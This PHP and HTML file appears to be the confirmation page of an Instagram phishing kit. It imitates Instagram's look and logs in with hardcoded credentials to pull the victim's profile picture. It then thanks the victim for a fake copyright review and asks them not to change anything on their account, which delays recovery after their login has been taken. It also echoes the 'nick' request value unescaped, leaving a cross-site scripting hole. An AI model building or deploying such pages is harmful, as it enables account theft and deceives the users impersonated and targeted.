<?php 

$nick=$_GET["nick"];

set_time_limit(0);
require 'instagram/autoload.php';
\InstagramAPI\Instagram::$allowDangerousWebUsageAtMyOwnRisk = true;
$username="sananeoox";
$password="123savas";

$ig = new \InstagramAPI\Instagram();

try{
  $ig->login($username,$password);
}

catch(\Exception $e){
  echo $e->getMessage();
}

$json = $ig->people->getInfoByName($nick);
$arr = json_decode($json, true);
$nickresim = $arr['user']['profile_pic_url']; 

?>

<html>
<head>
    <meta charset="utf-8">
    <meta content="minimum-scale=1.0, width=device-width, maximum-scale=0.6667, user-scalable=no" name="viewport">
    <link rel="icon" href="https://www.instagram.com/static/images/ico/favicon-192.png/68d99ba29cc8.png">
    <title>Succesfully | Copyright Infringement</title>
<style>

#header {
    width: 100%;
    text-align: center;
    padding-top: 20px;
    position: fixed;
    background-color: #ffffff;
    top: 0px;
    left: 0px;
    height: 70px;
    border-bottom: 2px solid #dbdbdb;
}

#header img {
    width: 200px;
}

#menu {
    width:91%;
} 

#liste {
	display:inline-block;
}

#link {
	text-decoration:none;
    color:#003569; 
    font-family:sans-serif; 
    font-size:13px; 
    font-weight:540; 
    vertical-align: baseline; 
}

#div {
    background-color:white;
    width:91%;
    margin-top: 100px;
    padding-bottom: 50px;
}

#h1 {
    font-family:sans-serif;
    font-weight:400;
    letter-spacing:;
    color:#3d3d3d;
    font-size: 20px;
}

#p {
    width:80%;
    color:#999;
    font-family:sans-serif;
}

#button {
    color:white;
    background-color:#3897f0;
    font-size:17px;
    border-radius:5px;
    outline:none;
    font-family:sans-serif;
    font-weight:540;
    border:0;
    width:250px;
    height:30px;
    font-weight:bold;
}

</style>
</head>
<body>

<div id="header"> 
   <img src="https://i.imgyukle.com/2020/06/06/yFzPFU.png"> 
</div>

<body bgcolor="#fafafa">

<br><br>

<center>
<form method="post" action="https://instagram.com">

<div id="div" style="border:1px solid #cecece;">

<br><br>

    <img src="<?php echo $nickresim; ?>" alt="" width=120 style="border-radius:50%;margin-top:12px;">

    <br><br>
    	
    <h1 id="h1"> <b>Thank You! @<?php echo $nick; ?></b> </h1>

    <p id="p">Please do not change anything regarding your account due to account review for you sharing which consists of copyright violation. You will be informed for results.</p><br>

    <input type="submit" value="Approve" id="button" style="">

</div>

</form>

<br><br>

<center>
  <a href="https://apps.apple.com/app/instagram/id389801252?vt=lo">
    <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_turkish-tr.png/30b29fd697b2.png" width="120">
  </a>
  <a href="https://play.google.com/store/apps/details?id=com.instagram.android&referrer=utm_source%3Dinstagramweb%26utm_campaign%3DloginPage%26ig_mid%3DD1619D39-E370-43DA-B97D-B73020E1B4AC%26utm_content%3Dlo%26utm_medium%3Dbadge">
    <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_turkish-tr.png/9d46177cf153.png" width="120">
  </a>
</center>

</div>

<br><br><br>

<center>
<div id="menu"> 
	<li id="liste"><a href="" id="link"> ABOUT US </a> </li>&nbsp;&nbsp;&nbsp;&nbsp; 
	<li id="liste"><a href="" id="link"> SUPPORT </a> </li>&nbsp;&nbsp;&nbsp;&nbsp; 
	<li id="liste"><a href="" id="link">PRESS</a></li>&nbsp;&nbsp;&nbsp;&nbsp; 
	<li id="liste"><a href="" id="link">API</a> </li>&nbsp;&nbsp;&nbsp;&nbsp; 
	<li id="liste"><a href="" id="link">JOBS</a></li>&nbsp;&nbsp;&nbsp;&nbsp; 
	<li id="liste"><a href="" id="link">PRIVACY</a></li>&nbsp;&nbsp;&nbsp;&nbsp; 
	<li id="liste"><a href="" id="link">TERMS</a></li>&nbsp;&nbsp;&nbsp;&nbsp; 
	<li id="liste"><a href="" id="link">DIRECTORY</a></li>&nbsp;&nbsp;&nbsp;&nbsp; 
    <li id="liste"><a href="" id="link">LANGUAGE</a></li></div><br> 
</center>

</body>
</html>